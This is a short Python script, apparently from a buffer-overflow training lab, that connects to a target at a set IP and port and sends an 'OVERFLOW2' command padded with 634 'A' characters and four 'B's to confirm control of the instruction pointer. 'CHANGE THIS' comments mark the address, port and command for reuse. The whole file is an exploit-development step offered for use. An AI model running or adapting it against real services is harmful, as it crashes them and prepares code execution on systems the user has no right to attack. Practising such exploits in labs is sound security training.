#!/usr/bin/env python3
import sys, socket

offset = 634 #This number is returned from the pattern_offset.rb module, provide the value this command returned.
shellcode = "A" * offset + "B" * 4 

address = '10.10.211.46' #CHANGE THIS
port = 1337 #CHANGE THIS
vulncommand = 'OVERFLOW2 ' # CHANGE THIS, the vulnerable command that was found in the spiking section would go here

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((address,port))

        s.send(bytes(vulncommand + shellcode, "latin-1"))
        s.close()

except:
        print("Error connecting to server")
        sys.exit()
